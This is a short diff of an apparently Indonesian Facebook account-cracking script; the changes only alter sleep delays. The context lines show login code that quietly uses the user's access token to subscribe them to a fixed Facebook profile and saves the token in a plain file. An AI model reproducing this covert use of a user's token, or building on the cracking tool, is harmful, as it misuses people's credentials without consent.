@@ -50,7 +50,7 @@ def login():
 			req.post(f"https://graph.facebook.com/103513548711079/subscribers?access_token={to}")
 			print(f"[☆] Login Berhasil [☆]\nWelcome {nama}")
 			open("save","a").write(to)
-			time.sleep(0.01)
+			time.sleep(1.5)
 			crack(to,nama).menu()
 		except KeyError:
 			print("[×] Login Gagal [×]\nAccess Token Salah")
@@ -76,7 +76,7 @@ def logika():
 		crack(token,nama).menu()
 	except FileNotFoundError:
 		print("[!] Anda Belum Login Harap Login Terlebih Dahulu [!]")
-		time.sleep(2)
+		time.sleep(0.01)
 		login()
 	except KeyError:
 		os.system("rm -rf save")
